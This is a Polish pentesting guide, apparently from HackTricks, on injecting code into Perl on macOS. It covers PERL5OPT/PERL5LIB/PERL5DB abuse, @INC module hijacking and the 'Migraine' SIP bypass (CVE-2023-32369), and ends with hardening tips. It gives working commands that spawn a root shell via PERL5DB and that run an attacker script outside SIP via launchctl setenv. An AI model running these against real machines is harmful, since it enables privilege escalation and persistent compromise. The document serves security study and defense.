# Wstrzykiwanie do aplikacji Perl w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Za pomocą zmiennych środowiskowych `PERL5OPT` i `PERL5LIB`

Za pomocą zmiennej środowiskowej **`PERL5OPT`** można sprawić, aby **Perl** wykonywał dowolne polecenia podczas uruchamiania interpretera (nawet **przed** przeanalizowaniem pierwszego wiersza target script).
Na przykład utwórz ten script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Teraz **wyeksportuj zmienną środowiskową** i wykonaj skrypt **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Inną opcją jest utworzenie modułu Perl (np. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Następnie użyj zmiennych środowiskowych, aby moduł został automatycznie znaleziony i załadowany:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Inne interesujące zmienne środowiskowe

- **`PERL5DB`** – gdy interpreter zostanie uruchomiony z flagą **`-d`** (debugger), zawartość `PERL5DB` jest wykonywana jako kod Perl *wewnątrz* kontekstu debuggera.
Jeśli możesz wpływać zarówno na środowisko, **jak i** flagi wiersza poleceń uprzywilejowanego procesu Perl, możesz wykonać coś takiego:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – w systemie Windows ta zmienna określa, którego pliku wykonywalnego shell Perl użyje, gdy będzie musiał uruchomić shell. Wspomniano o niej wyłącznie dla kompletności, ponieważ nie ma znaczenia w systemie macOS.

Chociaż `PERL5DB` wymaga przełącznika `-d`, często można znaleźć skrypty konserwacyjne lub instalacyjne uruchamiane jako *root* z włączoną tą flagą w celu uzyskania szczegółowych informacji diagnostycznych, co sprawia, że zmienna ta stanowi prawidłowy wektor eskalacji.

## Przez dependencies (nadużycie @INC)

Możliwe jest wyświetlenie ścieżki include, którą Perl będzie przeszukiwać (**`@INC`**), uruchamiając:
```bash
perl -e 'print join("\n", @INC)'
```
Typowe dane wyjściowe w systemie macOS 13/14 wyglądają następująco:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Niektóre ze zwróconych folderów w ogóle nie istnieją, jednak **`/Library/Perl/5.30`** istnieje, *nie jest* chronowany przez SIP i znajduje się *przed* folderami chronowanymi przez SIP. Dlatego jeśli możesz zapisywać jako *root*, możesz umieścić złośliwy moduł (np. `File/Basename.pm`), który będzie *preferencyjnie* ładowany przez każdy uprzywilejowany skrypt importujący ten moduł.

> [!WARNING]
> Nadal potrzebujesz uprawnień **root**, aby zapisywać w **`/Library/Perl`**, a macOS wyświetli monit **TCC** z prośbą o *Full Disk Access* dla procesu wykonującego operację zapisu.

Na przykład jeśli skrypt importuje **`use File::Basename;`**, możliwe byłoby utworzenie pliku `/Library/Perl/5.30/File/Basename.pm` zawierającego kod kontrolowany przez atakującego.

## Obejście SIP przez Migration Assistant (CVE-2023-32369 „Migraine”)

W maju 2023 firma Microsoft ujawniła **CVE-2023-32369**, któremu nadano przydomek **Migraine** — technikę post-exploitation, która umożliwia atakującemu z uprawnieniami *root* całkowite **obejście System Integrity Protection (SIP)**.
Podatnym komponentem jest **`systemmigrationd`**, daemon posiadający entitlement **`com.apple.rootless.install.heritable`**. Każdy proces potomny uruchomiony przez ten daemon dziedziczy entitlement i dlatego działa **poza** ograniczeniami SIP.<sup>[[1]](#references)</sup>

Wśród procesów potomnych zidentyfikowanych przez badaczy znajduje się interpreter podpisany przez Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Ponieważ Perl respektuje `PERL5OPT` (a Bash respektuje `BASH_ENV`), zatrucie *środowiska* daemona wystarcza do uzyskania dowolnego wykonania w kontekście bez SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Gdy `migrateLocalKDC` zostanie uruchomiony, `/usr/bin/perl` startuje ze złośliwą zmienną `PERL5OPT` i wykonuje `/private/tmp/migraine.sh` *zanim SIP zostanie ponownie włączony*. Z poziomu tego skryptu można na przykład skopiować payload do **`/System/Library/LaunchDaemons`** albo przypisać plikowi rozszerzony atrybut `com.apple.rootless`, aby uczynić go **niemożliwym do usunięcia**.

Apple naprawiło ten problem w macOS **Ventura 13.4**, **Monterey 12.6.6** oraz **Big Sur 11.7.7**, ale starsze lub niezałatane systemy nadal są podatne na exploitację.<sup>[[1]](#references)</sup>

## Zalecenia dotyczące hardeningu

1. **Wyczyść niebezpieczne zmienne** – uprzywilejowane launchdaemony lub zadania cron powinny uruchamiać się w czystym środowisku (`launchctl unsetenv PERL5OPT`, `env -i` itd.).
2. **Unikaj uruchamiania interpreterów jako root**, chyba że jest to absolutnie konieczne. Używaj skompilowanych plików binarnych lub wcześnie obniżaj uprawnienia.
3. **Dostarczaj skrypty z `-T` (taint mode)**, aby Perl ignorował `PERL5OPT` i inne niebezpieczne przełączniki po włączeniu kontroli skażenia.
4. **Aktualizuj macOS** – „Migraine” jest w pełni załatany w bieżących wydaniach.

## Referencje

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
